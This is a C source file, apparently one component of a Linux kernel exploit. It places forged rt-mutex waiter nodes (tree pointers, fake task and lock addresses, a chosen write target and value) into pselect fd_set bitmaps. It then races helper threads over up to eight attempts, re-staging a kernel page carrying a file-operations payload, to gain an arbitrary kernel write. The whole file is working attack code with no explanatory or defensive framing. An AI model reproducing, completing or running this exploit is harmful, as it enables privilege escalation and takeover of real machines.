#include "common.h"

#define PSELECT_ROUTE_ATTEMPTS 8

void fdset_put_word(fd_set *set, int word, uint64_t value) {
  unsigned long *bits = (unsigned long *)set;
  bits[word] = (unsigned long)value;
}

uint64_t fdset_get_word(const fd_set *set, int word) {
  const unsigned long *bits = (const unsigned long *)set;
  return bits[word];
}

static int pselect_words_per_set(void) {
  int bits_per_word = (int)(8 * sizeof(unsigned long));
  return (PSELECT_ROUTE_NFDS + bits_per_word - 1) / bits_per_word;
}

static int pselect_put_global_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int global_word, uint64_t value) {
  if (global_word < 0) {
    return 0;
  }

  int set_idx = global_word / words_per_set;
  int word_idx = global_word % words_per_set;
  switch (set_idx) {
    case 0:
      fdset_put_word(in, word_idx, value);
      return 1;
    case 1:
      fdset_put_word(out, word_idx, value);
      return 1;
    case 2:
      fdset_put_word(ex, word_idx, value);
      return 1;
    default:
      return 0;
  }
}

static void pselect_put_waiter_word(
    fd_set *in, fd_set *out, fd_set *ex, int words_per_set,
    int waiter_word, uint64_t value, const char *name) {
  int global_word = PSELECT_WAITER_WORD_SHIFT + waiter_word;
  if (!pselect_put_global_word(
          in, out, ex, words_per_set, global_word, value)) {
    pr_error("pselect cannot place %s waiter_word=%d global_word=%d\n",
             name, waiter_word, global_word);
  }
}

static void open_selected_fds(
    fd_set *in, fd_set *out, fd_set *ex, int read_fd) {
  int high_read = fcntl(read_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 32);
  if (high_read < 0) {
    pr_error("pselect F_DUPFD read errno=%d\n", errno);
  }
  for (int fd = 0; fd < PSELECT_ROUTE_NFDS; fd++) {
    if (FD_ISSET(fd, in) || FD_ISSET(fd, out) || FD_ISSET(fd, ex)) {
      SYSCHK(dup2(high_read, fd));
    }
  }
  close(high_read);
  SYSCHK(dup2(read_fd, PSELECT_ROUTE_NFDS - 1));
  FD_SET(PSELECT_ROUTE_NFDS - 1, ex);
}

static void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
  FD_ZERO(in);
  FD_ZERO(out);
  FD_ZERO(ex);

  uintptr_t target = pselect_write_target();
  uintptr_t value = pselect_write_value();
  uintptr_t parent = value;
  uintptr_t right = 0;
  uintptr_t left = target;

  if (pselect_write_shape() == 1) {
    if (target < 8) {
      pr_error("shape1 target underflow target=%016zx\n", target);
    }
    parent = target - 8;
    right = value;
    left = 0;
  }

  struct waiter_word {
    int word;
    uint64_t value;
    const char *name;
  } words[] = {
    {0, parent, "tree_parent"},
    {1, right, "tree_right"},
    {2, left, "tree_left"},
    {3, FAKE_WAITER_PRIO, "tree_prio"},
    {4, 0, "tree_deadline"},
    {5, parent, "pi_parent"},
    {6, right, "pi_right"},
    {7, left, "pi_left"},
    {8, FAKE_WAITER_PRIO, "pi_prio"},
    {9, 0, "pi_deadline"},
    {10, fake_task, "task"},
    {11, fake_lock, "lock"},
    {12, 3, "wake_state"},
  };

  int words_per_set = pselect_words_per_set();
  for (size_t i = 0; i < sizeof(words) / sizeof(words[0]); i++) {
    pselect_put_waiter_word(
        in, out, ex, words_per_set, words[i].word,
        words[i].value, words[i].name);
  }
}

void do_pselect_fake_lock_route(void) {
  if (!page_base || !fake_lock || !fake_task) {
    pr_error("pselect route missing page=%016zx lock=%016zx task=%016zx\n",
             page_base, fake_lock, fake_task);
  }

  for (int attempt = 1; attempt <= PSELECT_ROUTE_ATTEMPTS; attempt++) {
    if (attempt != 1) {
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      if (!page_base || !fake_lock || !fake_task) {
        pr_error("pselect retry page prepare failed attempt=%d\n", attempt);
      }
    }

    int pipefd[2];
    SYSCHK(pipe(pipefd));
    int block_fd = (int)syscall(SYS_timerfd_create, CLOCK_MONOTONIC, 0);
    if (block_fd < 0) {
      block_fd = pipefd[0];
    }
    int high_read = SYSCHK(fcntl(
        block_fd, F_DUPFD, PSELECT_ROUTE_NFDS + 16));

    fd_set in;
    fd_set out;
    fd_set ex;
    prepare_pselect_fdsets(&in, &out, &ex);
    open_selected_fds(&in, &out, &ex, high_read);

    atomic_store(&consumer_calls, 0);
    atomic_store(&consumer_success, 0);
    atomic_store(&punch_consume_stop, 0);
    atomic_store(&main_route_delay_usec, 0);
    atomic_store(&punch_consume_go, attempt);

    struct timespec timeout = {
      .tv_sec = PSELECT_TIMEOUT_SEC,
      .tv_nsec = 0,
    };
    errno = 0;
    int ret = pselect(
        PSELECT_ROUTE_NFDS, &in, &out, &ex, &timeout, NULL);
    int saved_errno = errno;
    atomic_store(&punch_consume_go, 0);

    int calls = atomic_load(&consumer_calls);
    int success = atomic_load(&consumer_success);
    pr_info("pselect attempt=%d ret=%d errno=%d calls=%d success=%d\n",
            attempt, ret, saved_errno, calls, success);

    close(high_read);
    if (block_fd != pipefd[0]) {
      close(block_fd);
    }
    close(pipefd[0]);
    close(pipefd[1]);

    if (calls > 0 && success > 0) {
      return;
    }
  }

  pr_error("pselect route exhausted\n");
}
